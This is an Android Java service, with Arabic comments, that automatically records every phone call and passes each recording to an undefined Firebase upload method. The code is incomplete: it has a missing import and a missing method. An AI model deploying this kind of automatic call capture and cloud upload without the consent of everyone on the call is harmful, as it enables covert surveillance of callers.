package com.example.installing_package;


import java.io.IOException;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;


public class CallRecordingService extends Service {

    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private MediaRecorder recorder;
    private File audioFile;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("📞 تسجيل المكالمات")
                .setContentText("الخدمة تعمل في الخلفية...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setOngoing(true)
                .build();

        startForeground(1, notification);
        Log.d("CallRecordingService", "✅ تم بدء الخدمة في الخلفية");

        // بدء الاستماع لحالة المكالمات
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("CallRecordingService", "🟢 الخدمة تعمل الآن");
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Recorder Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ✅ الكلاس الداخلي الذي يستمع لحالة المكالمات
    private class PhoneListener extends PhoneStateListener {

        private boolean isRecording = false;

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    if (!isRecording) {
                        startRecording();
                        isRecording = true;
                    }
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    if (isRecording) {
                        stopRecording();
                        isRecording = false;
                    }
                    break;
            }
        }
    }

    // ✅ بدء التسجيل
    private void startRecording() {
        try {
            File dir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "CallRecordings");
            if (!dir.exists()) dir.mkdirs();

            audioFile = new File(dir, "call_" + System.currentTimeMillis() + ".mp4");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION); // جرب MIC أو VOICE_RECOGNITION إذا ما اشتغل
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            Log.d("CallRecordingService", "🎙️ بدء تسجيل المكالمة");

        } catch (IOException e) {
            Log.e("CallRecordingService", "❌ خطأ في بدء التسجيل: " + e.getMessage());
        }
    }

    // ✅ إيقاف التسجيل
    private void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                Log.d("CallRecordingService", "✅ تم إيقاف التسجيل: " + audioFile.getAbsolutePath());

                uploadRecordingToFirebase(audioFile); // 📤 رفع الملف بعد التوقف
            }
        } catch (Exception e) {
            Log.e("CallRecordingService", "❌ خطأ في إيقاف التسجيل: " + e.getMessage());
        }
    }

}
